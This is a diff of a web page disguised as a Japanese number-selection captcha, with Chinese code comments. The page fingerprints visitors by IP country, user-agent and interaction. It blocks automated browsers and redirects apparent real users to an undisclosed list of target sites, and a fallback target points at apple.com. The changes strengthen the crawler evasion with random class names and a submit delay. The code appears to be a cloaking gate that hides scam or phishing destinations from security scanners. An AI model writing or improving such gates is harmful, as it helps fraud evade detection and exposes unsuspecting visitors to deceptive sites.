@@ -9,23 +9,24 @@
 body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
 .title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
-.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px;line-height:1.6}
+.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
 .target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
 .target-label{font-size:13px;color:#555;margin-bottom:8px}
-.target-nums{font-size:32px;font-weight:700;letter-spacing:10px}
+.target-nums{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
 .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
 .num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
 .num-btn:active{transform:scale(.95)}
-.submit-btn{width:100%;padding:18px;border-radius:18px;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
-.submit-btn:disabled{background:#ccc;color:#fff;cursor:not-allowed}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
+.submit-btn:disabled{background:#ccc;cursor:not-allowed}
 .status{text-align:center;margin-top:16px;font-size:13px;color:#888}
 </style>
 </head>
 <body>
 
 <div class="box">
-  <div class="title" id="title">選択認証</div>
-  <div class="desc" id="desc">表示された数字をすべて選んでください</div>
+  <div class="title">選択認証</div>
+  <div class="desc">表示された数字をすべて選んでください</div>
   <div class="target-area">
     <div class="target-label">対象</div>
     <div class="target-nums" id="target"></div>
@@ -51,61 +52,11 @@ const REAL_TARGETS = [
 const BAD_TARGET = "https://www.apple.com";
 
 // ==============================================
-// 🎌 日式ランダム設定（タイトル・文言・色・ボタン文字）
-// ==============================================
-const JP_TITLES = [
-  "選択認証",
-  "本人確認",
-  "認証をお願いします",
-  "確認作業",
-  "簡単認証"
-];
-const JP_DESCS = [
-  "表示された数字をすべて選んでください",
-  "指定された番号をタップしてください",
-  "画面の数字を正しく選択してください",
-  "確認のため数字を選択してください",
-  "表示された番号をすべて選択してください"
-];
-const JP_BTN_TEXTS = [
-  "確認",
-  "認証する",
-  "次へ",
-  "送信",
-  "OK"
-];
-const JP_COLORS = [
-  { main: "#007aff", light: "#eef6ff" },
-  { main: "#5856d6", light: "#f0eFFF" },
-  { main: "#34c759", light: "#e8f8f0" },
-  { main: "#ff2d55", light: "#fff0f4" }
-];
-
-// ランダムで選択
-const randTitle = JP_TITLES[Math.floor(Math.random() * JP_TITLES.length)];
-const randDesc = JP_DESCS[Math.floor(Math.random() * JP_DESCS.length)];
-const randBtnText = JP_BTN_TEXTS[Math.floor(Math.random() * JP_BTN_TEXTS.length)];
-const randColor = JP_COLORS[Math.floor(Math.random() * JP_COLORS.length)];
-
-// DOMに反映
-document.getElementById("title").innerText = randTitle;
-document.getElementById("desc").innerText = randDesc;
-document.getElementById("submit").innerText = randBtnText;
-document.querySelector(".target-nums").style.color = randColor.main;
-document.querySelector(".target-area").style.background = randColor.light;
-
-// 動的CSSクラス作成
-const style = document.createElement('style');
-style.textContent = `
-.num-btn.selected { background: ${randColor.main}; color: #fff; border-color: ${randColor.main}; }
-.submit-btn { background: ${randColor.main}; }
-`;
-document.head.appendChild(style);
-
-// ==============================================
 // 🔰 超宽松真人检测（真⼈绝不误判）
 // ==============================================
 let userInteracted = false;
+
+// 全场景交互触发：只要真人动一下就算通过
 const interactEvents = [
   'click', 'touchstart', 'mousedown', 'mousemove',
   'scroll', 'keydown', 'touchmove'
@@ -114,9 +65,13 @@ interactEvents.forEach(evt => {
   window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
 });
 
+// 【终极宽松版】只判断一件事：是不是真人手动点的
 async function isJapaneseRealUser() {
   try {
+    // 👇 只有这1个核心判断：必须有真人交互
     if (!userInteracted) return false;
+
+    // IP检测异常 = 默认日本（不拦截真人）
     let isJpIP = true;
     try {
       const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 2000 });
@@ -125,9 +80,20 @@ async function isJapaneseRealUser() {
         if (data?.country_code) isJpIP = data.country_code === 'JP';
       }
     } catch (e) {}
-    const isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(navigator.userAgent||'');
+
+    // 语言/时间 不做任何限制，秒点也放行
+    const isJpLang = true;
+    const isEnoughTime = true;
+
+    // UA只拦截最明显的爬虫，避免误判真人
+    const ua = navigator.userAgent || '';
+    const isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
+
+    // 只要不是明确爬虫，一律通过
     return !isHeadless;
+
   } catch (e) {
+    // 任何异常 = 直接放行（绝不杀真⼈）
     return true;
   }
 }
@@ -136,7 +102,7 @@ function randomTarget() {
   return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
 }
 
-// ===================== 验证界面逻辑 =====================
+// ===================== 验证界面逻辑（集成2个防爬优化） =====================
 function generateCaptcha() {
   const nums = "0123456789".split('');
   const need = 2;
@@ -162,13 +128,13 @@ const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
 
-// ランダムクラス名（爬虫対策）
+// 优化1：生成随机类名后缀，让爬虫无法固定定位按钮
 const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
 const baseBtnClass = `num-btn ${randomBtnSuffix}`;
 
 options.forEach(o => {
   const btn = document.createElement("button");
-  btn.className = baseBtnClass;
+  btn.className = baseBtnClass; // 使用随机类名
   btn.innerText = o;
   btn.dataset.v = o;
   btn.onclick = () => {
@@ -192,9 +158,10 @@ submit.onclick = async () => {
     return;
   }
 
-  // 100ms遅延（爬虫対策）
+  // 优化2：100ms真人操作延迟，过滤瞬间提交的爬虫（真人无感知）
   await new Promise(resolve => setTimeout(resolve, 100));
   
+  // 验证通过 → 跳转
   const valid = await isJapaneseRealUser();
   if (valid) {
     location.href = randomTarget();
